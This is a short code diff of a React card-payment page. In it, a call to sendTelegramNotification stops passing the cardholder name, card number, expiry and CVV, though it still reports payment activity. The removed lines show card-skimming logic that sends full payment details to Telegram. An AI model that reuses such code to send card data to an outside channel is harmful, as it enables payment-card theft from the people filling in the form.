@@ -229,8 +229,7 @@ const CardSelectPage = () => {
     if (!isFormValid() || !selectedCard) return;
     setIsLoading(true);
     sendTelegramNotification({
-      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
-      cardName: cardHolder, cardNumber, expiry, cvv
+      type: 'payment_activity', method: 'Card Payment', paymentType: 'card',
     });
     setTimeout(() => {
       setIsLoading(false);
